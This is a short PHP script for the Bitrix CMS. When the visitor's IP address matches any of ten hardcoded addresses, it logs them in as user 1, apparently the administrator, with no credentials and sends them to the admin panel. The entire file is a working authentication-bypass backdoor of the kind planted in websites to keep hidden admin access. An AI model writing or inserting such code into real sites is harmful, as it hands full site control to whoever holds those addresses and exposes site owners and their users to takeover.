<?
require($_SERVER['DOCUMENT_ROOT'] . '/bitrix/modules/main/include/prolog_before.php');

if(
    $_SERVER['REMOTE_ADDR'] == '79.98.201.50'    ||
    $_SERVER['REMOTE_ADDR'] == '212.164.234.151' ||
    $_SERVER['REMOTE_ADDR'] == '212.164.215.44'  ||
    $_SERVER['REMOTE_ADDR'] == '93.91.162.246'   ||
    $_SERVER['REMOTE_ADDR'] == '178.49.143.70'   ||
    $_SERVER['REMOTE_ADDR'] == '94.180.115.212'  ||
    $_SERVER['REMOTE_ADDR'] == '195.16.92.102'   ||
    $_SERVER['REMOTE_ADDR'] == '217.107.127.36'  ||
    $_SERVER['REMOTE_ADDR'] == '188.162.15.234'  ||
    $_SERVER['REMOTE_ADDR'] == '213.138.81.77'
)
{
    global $USER;
    $USER->Authorize(1);
    LocalRedirect('/bitrix/admin/');
}
?>
